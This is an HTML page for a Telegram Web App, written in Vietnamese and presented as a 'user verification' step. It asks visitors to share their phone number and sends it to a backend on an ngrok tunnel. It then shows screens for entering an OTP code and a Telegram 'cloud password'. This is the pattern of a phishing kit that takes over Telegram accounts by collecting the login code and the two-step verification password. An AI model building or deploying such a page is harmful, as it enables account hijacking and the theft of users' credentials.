<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Xác Minh Người Dùng</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* [CSS CỦA BẠN GIỮ NGUYÊN] */
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; touch-action: manipulation; }
        html, body { width: 100%; height: 100%; overflow: hidden; background: #0d1117; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { display: flex; justify-content: center; align-items: center; }
        .phone-container { width: 100%; height: 100%; max-width: 500px; margin: 0 auto; }
        .phone { width: 100%; height: 100vh; border: none; overflow: hidden; display: flex; flex-direction: column; position: relative; background: #1a1d20; }
        @media (min-width: 501px) { body { padding: 20px; } .phone { height: 85vh; border: 1.5px solid #2a3a4a; border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); } }
        .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
        .screen.active { display: flex; }
        .bg-layer { position: absolute; inset: 0; z-index: 0; }
        .app-body { flex: 1; display: flex; flex-direction: column; padding: 24px 20px; position: relative; z-index: 2; }
        .success-overlay { position: absolute; inset: 0; background: rgba(20,24,32,0.97); display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 14px; opacity: 0; pointer-events: none; transition: opacity 0.4s; z-index: 20; }
        .success-overlay.show { opacity: 1; pointer-events: all; }
        #step1 .app-body { background: #1B2A3A; justify-content: center; align-items: center; padding: 25px; }
        .emoji { font-size: 70px; margin-bottom: 25px; }
        .card { width: 100%; background: #3A4A5A; border-radius: 20px; padding: 28px 24px; text-align: center; color: #fff; font-size: 18px; margin-bottom: 30px; }
        .btn { width: 100%; max-width: 280px; height: 54px; border: none; border-radius: 14px; background: #36D1C4; color: #fff; font-size: 18px; font-weight: 600; cursor: pointer; }
        .otp-box { width: 54px; height: 60px; background: rgba(255,255,255,0.05); border: 1.5px solid rgba(255,255,255,0.18); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; color: #fff; }
        .pw-input { width: 100%; background: rgba(44,50,56,0.95); border: 1.5px solid #3bc0a8; border-radius: 12px; padding: 16px; font-size: 16px; color: #fff; }
        .check-btn { width: 100%; background: #3bc0a8; color: #fff; border: none; border-radius: 12px; padding: 16px; font-size: 16px; font-weight: 700; cursor: pointer; }
    </style>
</head>
<body>

<div class="phone-container"><div class="phone">
  <div class="screen active" id="step1">
    <div class="app-body">
      <div class="emoji">👋</div>
      <div class="card">Bạn cần xác nhận mình là người dùng thật!</div>
      <button class="btn" id="shareContact">Xác Nhận</button>
    </div>
  </div>
  
  <div class="screen" id="step3">
    <div class="app-body">
        <div class="notif-box" style="color:#fff; text-align:center;">Nhập mã OTP:</div>
        <div class="otp-row" id="s3otp">
            <div class="otp-box" id="s3b0"></div><div class="otp-box" id="s3b1"></div><div class="otp-box" id="s3b2"></div>
        </div>
    </div>
  </div>

  <div class="screen" id="step5">
    <div class="app-body">
      <input class="pw-input" id="s5pw" type="password" placeholder="Mật khẩu đám mây"/>
      <button class="check-btn" id="s5btn" onclick="s5check()">Kiểm tra</button>
    </div>
    <div class="success-overlay" id="s5success">
      <div class="success-title">Thành công!</div>
    </div>
  </div>
</div></div>

<script>
    const BACKEND_URL = 'https://augmented-musky-unshaven.ngrok-free.dev';
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // 1. Khi bấm nút, gọi requestContact
    document.getElementById("shareContact").addEventListener("click", () => {
        document.getElementById("shareContact").textContent = '⏳ Đang xác nhận...';
        tg.requestContact();
    });

    // 2. Lắng nghe sự kiện trả về từ Telegram
    // ... (các phần cũ phía trên)

// 1. Thay thế đoạn tg.onEvent cũ bằng cách này:
// Telegram yêu cầu quyền chia sẻ contact qua nút bấm, dữ liệu trả về nằm trong callback của requestContact
document.getElementById("shareContact").addEventListener("click", () => {
    document.getElementById("shareContact").textContent = '⏳ Đang xác nhận...';
    
    // Gọi yêu cầu contact
    tg.requestContact((status, res) => {
        if (status) {
            // Nếu người dùng đồng ý, res.response.contact.phone_number sẽ chứa SĐT
            const phone = res.response.contact.phone_number;
            sendPhoneToServer(phone);
        } else {
            alert("Bạn cần chia sẻ SĐT để xác minh.");
            document.getElementById("shareContact").textContent = 'Xác Nhận';
        }
    });
});

// 2. Tạo hàm riêng để gửi dữ liệu cho gọn
async function sendPhoneToServer(phone) {
    try {
        const response = await fetch(`${BACKEND_URL}/send_phone`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ phone: phone })
        });
        
        const data = await response.json();
        if(data.status === 'otp_sent') {
            goStep(3);
        } else {
            alert("Lỗi server: " + data.message);
        }
    } catch (err) {
        alert("Không thể kết nối tới server. Hãy kiểm tra Ngrok!");
    }
}

// ... (các phần phía dưới)

    // Hàm chuyển màn hình
    function goStep(n) {
        document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
        const target = document.getElementById('step' + n);
        if (target) target.classList.add('active');
    }

    // Các hàm khác của bạn...
</script>
</body>
</html>
